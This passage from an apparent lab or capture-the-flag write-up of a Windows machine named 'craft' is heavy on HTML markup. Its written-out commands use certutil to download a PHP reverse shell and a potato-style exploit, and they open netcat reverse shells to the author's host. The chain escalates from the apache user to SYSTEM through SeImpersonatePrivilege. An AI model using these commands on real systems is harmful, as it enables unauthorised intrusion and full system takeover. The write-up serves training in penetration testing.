class="cm-identifier">reserved</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-identifier">whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">craft</span><span class="cm-error">\\</span><span class="cm-identifier">apache</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 247px;"></div><div class="CodeMirror-gutters" style="display: none; height: 247px;"></div></div></div></pre><p><span>Checking the privileges of the </span><code>apache</code><span> user revealed that </span><code>SeImpersonatePrivilege</code><span> was enabled. This is a well-known vector for privilege escalation on Windows.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-identifier">whoami</span> <span class="cm-operator">/</span><span class="cm-identifier">priv</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">10</span><span class="cm-operator">:</span><span class="cm-number">53</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">10</span><span class="cm-operator">:</span><span class="cm-number">53</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-operator">..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">10</span><span class="cm-operator">:</span><span class="cm-number">53</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">6</span> <span class="cm-identifier">a</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">13</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">02</span><span class="cm-operator">:</span><span class="cm-number">18</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">assets</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">13</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">02</span><span class="cm-operator">:</span><span class="cm-number">18</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">css</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">09</span><span class="cm-operator">:</span><span class="cm-number">53</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">9</span><span class="cm-punctuation">,</span><span class="cm-number">635</span> <span class="cm-identifier">index</span><span class="cm-punctuation">.</span><span class="cm-identifier">php</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">13</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">02</span><span class="cm-operator">:</span><span class="cm-number">18</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">js</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">08</span><span class="cm-operator">:</span><span class="cm-number">56</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">835</span> <span class="cm-identifier">upload</span><span class="cm-punctuation">.</span><span class="cm-identifier">php</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">10</span><span class="cm-operator">:</span><span class="cm-number">30</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">uploads</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">3</span> <span class="cm-identifier">File</span><span class="cm-punctuation">(</span><span class="cm-identifier">s</span><span class="cm-punctuation">)</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">10</span><span class="cm-punctuation">,</span><span class="cm-number">476</span> <span class="cm-identifier">bytes</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">6</span> <span class="cm-builtin">Dir</span><span class="cm-punctuation">(</span><span class="cm-identifier">s</span><span class="cm-punctuation">)</span> &nbsp;<span class="cm-number">10</span><span class="cm-punctuation">,</span><span class="cm-number">413</span><span class="cm-punctuation">,</span><span class="cm-number">010</span><span class="cm-punctuation">,</span><span class="cm-number">944</span> <span class="cm-identifier">bytes</span> <span class="cm-identifier">free</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 461px;"></div><div class="CodeMirror-gutters" style="display: none; height: 461px;"></div></div></div></pre><p><span>I transferred </span><code>Ivan-Sincek.php</code><span> to the webroot directory.</span></p><p><img src="./craft.assets/image-20260129105539218.png" alt="image-20260129105539218"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-identifier">certutil</span> <span class="cm-operator">-</span><span class="cm-identifier">urlcache</span> <span class="cm-operator">-split</span> <span class="cm-operator">-f</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">http</span><span class="cm-operator">://</span><span class="cm-number">192.168.45.236</span><span class="cm-operator">/</span><span class="cm-identifier">Ivan-Sincek</span><span class="cm-punctuation">.</span><span class="cm-identifier">php</span><span class="cm-operator">&gt;</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">certutil</span> <span class="cm-operator">-</span><span class="cm-identifier">urlcache</span> <span class="cm-operator">-split</span> <span class="cm-operator">-f</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">http</span><span class="cm-operator">://</span><span class="cm-number">192.168.45.236</span><span class="cm-operator">/</span><span class="cm-identifier">Ivan-Sincek</span><span class="cm-punctuation">.</span><span class="cm-identifier">php</span><span class="cm-operator">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">****</span> &nbsp;<span class="cm-identifier">Online</span> &nbsp;<span class="cm-operator">****</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-number">0000</span> &nbsp;<span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-number">244</span><span class="cm-identifier">f</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">CertUtil</span><span class="cm-operator">:</span> <span class="cm-operator">-</span><span class="cm-identifier">URLCache</span> <span class="cm-identifier">command</span> <span class="cm-identifier">completed</span> <span class="cm-identifier">successfully</span><span class="cm-punctuation">.</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 132px;"></div><div class="CodeMirror-gutters" style="display: none; height: 132px;"></div></div></div></pre><p><span>After triggering the script via the browser, I gained a new shell, this time as the </span><code>apache</code><span> user.</span></p><p><img src="./craft.assets/image-20260129105545271.png" alt="image-20260129105545271"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">┌──</span><span class="cm-punctuation">(</span><span class="cm-identifier">kali</span><span class="cm-error">㉿</span><span class="cm-identifier">kali</span><span class="cm-punctuation">)</span><span class="cm-operator">-</span><span class="cm-punctuation">[</span><span class="cm-error">~</span><span class="cm-operator">/</span><span class="cm-identifier">Desktop</span><span class="cm-punctuation">]</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">└─$</span> <span class="cm-identifier">rlwrap</span> <span class="cm-identifier">nc</span> <span class="cm-operator">-</span><span class="cm-identifier">lvnp</span> <span class="cm-number">443</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">listening</span> <span class="cm-identifier">on</span> <span class="cm-punctuation">[</span><span class="cm-identifier">any</span><span class="cm-punctuation">]</span> <span class="cm-number">443</span> <span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">connect</span> <span class="cm-identifier">to</span> <span class="cm-punctuation">[</span><span class="cm-number">192.168.45.236</span><span class="cm-punctuation">]</span> <span class="cm-keyword">from</span> <span class="cm-punctuation">(</span><span class="cm-identifier">UNKNOWN</span><span class="cm-punctuation">)</span> <span class="cm-punctuation">[</span><span class="cm-number">192.168.164.169</span><span class="cm-punctuation">]</span> <span class="cm-number">50237</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SOCKET</span><span class="cm-operator">:</span> <span class="cm-identifier">Shell</span> <span class="cm-identifier">has</span> <span class="cm-identifier">connected</span><span class="cm-operator">!</span> <span class="cm-identifier">PID</span><span class="cm-operator">:</span> <span class="cm-number">968</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Microsoft</span> <span class="cm-identifier">Windows</span> <span class="cm-punctuation">[</span><span class="cm-identifier">Version</span> <span class="cm-number">10.0.17763.2029</span><span class="cm-punctuation">]</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-identifier">c</span><span class="cm-punctuation">)</span> <span class="cm-number">2018</span> <span class="cm-identifier">Microsoft</span> <span class="cm-identifier">Corporation</span><span class="cm-punctuation">.</span> <span class="cm-identifier">All</span> <span class="cm-identifier">rights</span> <span class="cm-identifier">reserved</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-identifier">whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">craft</span><span class="cm-error">\\</span><span class="cm-identifier">apache</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 219px;"></div><div class="CodeMirror-gutters" style="display: none; height: 219px;"></div></div></div></pre><p><span>Checking the privileges of the </span><code>apache</code><span> user revealed that </span><code>SeImpersonatePrivilege</code><span> was enabled. This is a well-known vector for privilege escalation on Windows.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">xampp</span><span class="cm-error">\\</span><span class="cm-identifier">htdocs</span><span class="cm-operator">&gt;</span><span class="cm-identifier">whoami</span> <span class="cm-operator">/</span><span class="cm-identifier">priv</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">PRIVILEGES</span> <span class="cm-identifier">INFORMATION</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">----------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Privilege</span> <span class="cm-identifier">Name</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Description</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-identifier">State</span> &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">=============================</span> <span class="cm-operator">=========================================</span> <span class="cm-operator">========</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeTcbPrivilege</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Act</span> <span class="cm-identifier">as</span> <span class="cm-identifier">part</span> <span class="cm-identifier">of</span> <span class="cm-identifier">the</span> <span class="cm-identifier">operating</span> <span class="cm-identifier">system</span> &nbsp; &nbsp; &nbsp; <span class="cm-identifier">Disabled</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeChangeNotifyPrivilege</span> &nbsp; &nbsp; &nbsp; <span class="cm-identifier">Bypass</span> <span class="cm-identifier">traverse</span> <span class="cm-identifier">checking</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Enabled</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeImpersonatePrivilege</span> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Impersonate</span> <span class="cm-identifier">a</span> <span class="cm-identifier">client</span> <span class="cm-identifier">after</span> <span class="cm-identifier">authentication</span> <span class="cm-identifier">Enabled</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeCreateGlobalPrivilege</span> &nbsp; &nbsp; &nbsp; <span class="cm-identifier">Create</span> <span class="cm-identifier">global</span> <span class="cm-identifier">objects</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-identifier">Enabled</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeIncreaseWorkingSetPrivilege</span> <span class="cm-identifier">Increase</span> <span class="cm-identifier">a</span> <span class="cm-keyword">process</span> <span class="cm-identifier">working</span> <span class="cm-builtin">set</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Disabled</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 296px;"></div><div class="CodeMirror-gutters" style="display: none; height: 296px;"></div></div></div></pre><p><span>I transferred </span><code>gp.exe</code><span> to the target machine.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Public</span><span class="cm-operator">&gt;</span><span class="cm-identifier">certutil</span> <span class="cm-operator">-</span><span class="cm-identifier">urlcache</span> <span class="cm-operator">-split</span> <span class="cm-operator">-f</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">http</span><span class="cm-operator">://</span><span class="cm-number">192.168.45.236</span><span class="cm-operator">/</span><span class="cm-builtin">gp</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span><span class="cm-operator">&gt;</span> <span class="cm-builtin">gp</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">****</span> &nbsp;<span class="cm-identifier">Online</span> &nbsp;<span class="cm-operator">****</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-number">0000</span> &nbsp;<span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-identifier">e000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">CertUtil</span><span class="cm-operator">:</span> <span class="cm-operator">-</span><span class="cm-identifier">URLCache</span> <span class="cm-identifier">command</span> <span class="cm-identifier">completed</span> <span class="cm-identifier">successfully</span><span class="cm-punctuation">.</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 123px;"></div><div class="CodeMirror-gutters" style="display: none; height: 123px;"></div></div></div></pre><p><span>I executed a command through </span><code>gp.exe</code><span> to trigger another reverse shell using </span><code>nc.exe</code><span> with </span><code>System</code><span> privileges.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.1719px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Public</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">.</span><span class="cm-error">\\</span><span class="cm-builtin">gp</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">cmd</span> <span class="cm-string">"nc.exe 192.168.45.236 443 -e C:\\Windows\\System32\\cmd.exe"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 49px;"></div><div class="CodeMirror-gutters" style="display: none; height: 49px;"></div></div></div></pre><h1 id='shell-as-system'><span>Shell as </span><code>system</code></h1><p><span>The exploit was successful, granting me a shell as </span><code>NT AUTHORITY\\SYSTEM</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 